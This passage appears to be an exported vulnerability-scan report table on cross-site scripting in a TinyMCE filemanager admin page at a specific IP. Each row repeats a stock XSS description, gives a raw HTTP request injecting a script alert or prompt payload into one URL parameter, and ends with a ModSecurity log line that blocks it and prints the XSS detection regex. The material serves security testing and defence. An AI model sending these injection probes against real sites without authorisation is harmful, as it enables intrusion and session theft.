This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=&quot;&gt;&lt;script&gt;alert(471399)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=sv9oav0deske7l86bpvjvhciv6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:16</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:15 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(471399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttE6wQAW0AAHzDqscAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttE6wQAW0AAHzDqscAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366913</td><td class=xl24 width=64 >2015-03-31 22:13:11</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=&quot;&gt;&lt;script&gt;alert(194999)&lt;/script&gt;&lt;!--&amp;551ac2f5a7697=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%22%3Ealert%28194999%29%2F; PHPSESSID=i1kgi429d3vu0dm9o40r51kgo7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:17</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:16 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(194999)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttFKwQAW0AAHewA9cAAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttFKwQAW0AAHewA9cAAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366914</td><td class=xl24 width=64 >2015-03-31 22:16:37</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >551ac2f5a7697</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697=&quot;&gt;&lt;script&gt;alert(590199)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=eultd24v7q8cp12fld9nflms16
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:18</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:17 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:551ac2f5a7697. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(590199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttFawQAW0AABvT@HMAAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttFawQAW0AABvT@HMAAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366915</td><td class=xl24 width=64 >2015-03-31 22:16:57</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac2f5665c6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr='&gt;&lt;script&gt;alert(308599)&lt;/script&gt;&lt;!--&amp;551ac2f5665c6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%27%3Ealert%28308599%29%2F; PHPSESSID=30mnduf4vjh9oe7b8ciuimjvn7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:20</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:18 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(308599)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttFqwQAW0AAHhB77sAAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttFqwQAW0AAHhB77sAAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366916</td><td class=xl24 width=64 >2015-03-31 22:23:46</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&lt;script&gt;prompt(996399)&lt;/script/&gt;&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=blavv88id6ahosf6praug5bk24
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:21</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:20 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;&lt;script&gt;prompt(996399)&lt;/script/&gt;&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttGKwQAW0AAD9hYOMAAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttGKwQAW0AAD9hYOMAAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366917</td><td class=xl24 width=64 >2015-03-31 22:27:05</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type='&gt;&lt;script&gt;alert(679199)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=v35dr0n47g75ajt60n9mu1m975
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:22</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:21 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(679199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttGawQAW0AABt@bWIAAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttGawQAW0AABt@bWIAAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366918</td><td class=xl24 width=64 >2015-03-31 22:27:12</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=&quot;&gt;&lt;script&gt;alert(905499)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=odva1frjko90238lvdlbjdt537
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:23</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:22 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(905499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttGqwQAW0AAHchlVoAAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttGqwQAW0AAHchlVoAAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366919</td><td class=xl24 width=64 >2015-03-31 22:31:22</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


